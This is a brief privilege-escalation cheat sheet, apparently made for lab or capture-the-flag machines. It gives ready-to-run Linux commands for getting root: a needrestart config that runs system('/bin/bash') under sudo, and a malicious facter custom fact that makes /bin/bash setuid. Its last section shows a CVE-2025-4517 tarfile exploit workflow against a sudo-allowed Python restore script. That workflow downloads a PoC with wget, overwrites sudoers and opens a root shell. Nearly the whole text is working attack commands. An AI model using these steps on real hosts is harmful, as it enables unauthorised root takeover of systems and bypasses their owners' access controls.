##simple commands
```
ls -la
sudo -su
sudo -l
crontab -l
```
##using /bin/bash 
```
sudo -u user /bin/bash
```
##needrestart v3.7
```
echo 'system("/bin/bash");' > /tmp/root.sh

Now run needrestart, with sudo, using using that configuration file as an argument:

sudo /usr/sbin/needrestart -c /tmp/root.sh
```

##/usr/bin/facter
```
mkdir -p /tmp/exploit_facts

cd /tmp/exploit_facts/

cat > /tmp/exploit_facts/exploit.rb << 'EOF'
#!/usr/bin/env ruby
puts "custom_fact=exploited"
system("chmod +s /bin/bash")
EOF

sudo /usr/bin/facter --custom-dir=/tmp/exploit_facts/ x

bash -p
```
##(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *

CVE-2025-4517, a critical vulnerability in Python's tarfile module that allows arbitrary file write through a combination of symlink path traversal and hardlink manipulation. This bypasses the filter="data" protection introduced in Python 3.12.

```
wget https://raw.githubusercontent.com/AzureADTrent/CVE-2025-4517-POC-HTB/refs/heads/main/CVE-2025-4517-POC.py

```````````Manual Step-by-Step

# 1. Create the exploit tar
python3 exploit.py --create-only

# 2. Deploy to target
cp /tmp/cve_2025_4517_exploit.tar /opt/backup_clients/backups/backup_9999.tar

# 3. Execute via vulnerable script
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_9999.tar \
  -r restore_exploit

# 4. Verify sudoers modification
sudo cat /etc/sudoers | grep "$(whoami)"

# 5. Get root
sudo /bin/bash

```
